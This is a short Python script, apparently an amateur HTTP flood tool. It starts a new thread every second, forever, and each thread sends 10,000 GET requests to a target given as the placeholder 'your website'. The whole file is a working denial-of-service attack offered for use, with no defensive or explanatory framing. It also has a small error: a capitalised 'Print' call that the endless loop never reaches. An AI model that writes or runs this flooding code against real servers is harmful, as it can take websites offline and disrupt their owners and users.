import requests
import threading
import time


def DosAtack(server, count):
    for i in range(count):
        requests.get(server)


def startDosAtack(time1, server, count):
    while True:
        t1 = threading.Thread(target=DosAtack, args=(server, count))
        t1.start()
        time.sleep(time1)

startDosAtack(1, 'your website', 10000)
Print('Attack started')
